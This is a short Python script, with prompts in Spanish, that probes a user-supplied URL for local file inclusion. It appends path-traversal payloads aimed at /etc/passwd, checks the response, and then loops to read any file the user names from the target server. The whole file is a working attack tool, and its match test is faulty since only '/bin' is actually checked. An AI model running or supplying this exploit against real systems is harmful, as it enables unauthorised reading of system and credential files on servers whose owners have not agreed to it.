import requests
import argparse
from bs4 import BeautifulSoup


def LFI():
	target = input("Please input the target: ")
	payloads = ['../../../../../../etc/passwd','../../../../../../../../etc/passwd','/etc/passwd']
	if target:
		print("Target: {}".format(target))
		for p in payloads:
			print("\n======================================================================================")
			print("objetivo = {}".format(target+p))
			q = requests.get(target+p)
			if 'root' and 'bash' and '/bin' in q.text:
				print("Posible LFI: {}".format(target+p))
				b = BeautifulSoup(q.text,'html5lib')
				print(b.blockquote.text)
				opcion = input("Consultar archivos S/N: ")
				if opcion.lower() == 's':
					while True:
						f = input("Archivo a consultar: ")
						qf = requests.get(target+f)
						if 'Warning' in qf.text:
							print("El archivo especificado no existe")
						else:
							bf = BeautifulSoup(qf.text,'html5lib')
							print(bf.blockquote.text)
				elif opcion.lower() == 'n':
					pass

			print("\n======================================================================================")
	else:
		print("Especifica el objetivo a analizar")


	


if __name__ == '__main__':
	LFI()